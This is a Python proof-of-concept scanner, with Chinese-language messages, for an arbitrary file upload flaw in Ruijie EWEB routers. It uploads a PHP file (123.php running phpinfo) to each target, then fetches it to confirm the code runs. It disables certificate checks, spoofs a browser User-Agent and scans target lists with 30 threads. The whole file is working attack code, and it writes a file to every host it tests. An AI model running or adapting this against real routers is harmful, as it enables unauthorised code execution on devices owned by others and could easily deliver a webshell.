import requests
import argparse
import random
import sys

requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool

def get_random_ascii_art():
    arts = [
        r"""
          /\_/\  
         ( o.o ) 
          > ^ <
        """,
        r"""
         /|\\
        ( o o )
         > ^ <
        """,
        r"""
          .-. 
         | | |
         \_/ 
        """
    ]
    return random.choice(arts)


def main(domain):
    if ('http' in domain):
        check(domain)
    else:
        check(f"http://{domain}")


def check(domain):
    url =domain
    files = {
        'file': ('123.php', '<?php phpinfo();?>', 'text/plain')
    }
    data = {
        'uploadDir': 'upload'
    }
    try:
        response = requests.post(url=url, files=files,data=data,headers={'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15'},verify=False, timeout=5)
        response1 = requests.get(
            f"{domain}/ddi/server/upload/123.php",
            headers={"User-Agent": "Mozilla/5.0"},
            verify=False,
            timeout=10
        )
        if response1.status_code == 200 and 'phpinfo' in response1.text:
            print(f"[*]存在漏洞: {domain}")
        else:
            print(f"[-]不存在漏洞: {domain}")
    except Exception as e:
        print(f"错误地址{domain}")


if __name__ == '__main__':
    # 显示启动字符画（仅此处调用一次）
    print(get_random_ascii_art())
    print("锐捷EWEB路由器-fileupload.php存在任意文件上传")
    parse = argparse.ArgumentParser(description="锐捷EWEB路由器-fileupload.php存在任意文件上传检测工具")
    parse.add_argument('-u', '--url', dest='url', type=str, help='请输入目标URL')
    parse.add_argument('-f', '--file', dest='file', type=str, help='请输入包含目标URL的文件')
    args = parse.parse_args()
    if args.url:
        main(args.url)
    elif args.file:
        try:
            with open(args.file, 'r') as f:
                domains = [line.strip() for line in f if line.strip()]
                pool = Pool(30)
                pool.map(main, domains)
        except FileNotFoundError:
            print(f"错误: 文件 {args.file} 未找到")
    else:
        print("请提供URL或文件路径")
